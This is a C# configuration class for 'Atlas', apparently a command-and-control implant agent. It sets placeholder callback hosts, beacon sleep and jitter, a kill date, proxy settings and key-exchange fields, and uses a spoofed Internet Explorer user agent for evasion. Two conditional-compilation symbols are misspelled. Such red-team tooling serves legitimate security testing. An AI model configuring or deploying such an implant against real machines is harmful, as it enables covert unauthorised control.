#define DEFAULT_EKE

using System.Collections.Generic;

namespace Atlas
{
    public class Config
    {
        public static List<string> CallbackHosts = new List<string> { "http://127.0.0.1:9000" };
        public static List<Utils.Server> Servers = new List<Utils.Server> { };
        public static string PayloadUUID = "";
        public static string UUID = "";
        public static string UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
        public static string HostHeader = "";
        public static int Sleep = 5;
        public static int Jitter = 35;
        public static string KillDate = "";
        public static string Param = "id";
        public const int ChunkSize = 512000;
        public static bool DefaultProxy = true;
        public static string ProxyAddress = "";
        public static string ProxyUser = "";
        public static string ProxyPassword = "";
#if (DEFAULT || DEFULAT_PSK || DEFAULT_EKE)
        public static string Url = "/api/v1.4/agent_message";
#endif
#if (Default_PSK || DEFAULT_EKE)
        public static string Psk = "";
#endif
#if DEFAULT_EKE
        public static string SessionId = "";
        public static string tempUUID = "";
        public static System.Security.Cryptography.RSACryptoServiceProvider Rsa;
#endif
        public static Dictionary<string, string> Modules = new Dictionary<string, string>();
    }
}
